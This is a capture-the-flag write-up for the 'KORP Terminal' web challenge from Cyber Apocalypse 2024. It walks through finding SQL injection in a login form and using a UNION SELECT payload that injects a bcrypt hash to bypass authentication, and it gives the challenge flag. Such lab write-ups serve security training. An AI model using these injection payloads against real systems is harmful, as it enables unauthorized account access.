# Cyber Apocalypse 2024

## KORP Terminal

> Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols
> 
> Author: Lean
> 
> [`web_timekorp.zip`](web_timekorp.zip)

Tags: _web_

## Solution
We get another webapp. A terminal where we can log into. After some trial and error it looks like this could be a `sqli` challenge.

```bash
user: admin'
password: x
```

This gives us a error message `{"error":{"message":["1064","1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin''' at line 1","42000"],"type":"ProgrammingError"}}`

The typical payloads are not working. Also anything what is written to password doesn't really trigger an error, so we can assume the content of password is hashed such like `SELECT user, password WHERE password = MD5({password}) AND user = '{user}'`. 

Lets try if we can inject our own password hash:

```bash
user: ' AND 1=0 UNION ALL SELECT '098f6bcd4621d373cade4e832627b4f6
password: test
```

This gives us `{"error":{"message":["Invalid salt"],"type":"ValueError"}}`, so MD5 is not the hash algorithm. Salt hints `Bcrypt`, so lets hash our password `test` again, this time with Bcrypt.

```bash
user: admin' AND 1=0 UNION ALL SELECT '$2a$12$fuqOG.Xuqon6cO9bX2d5OuQGzKvi3BKDoE6a5n3t3GpqyNBdiZqJe
password: test
```

Flag `HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`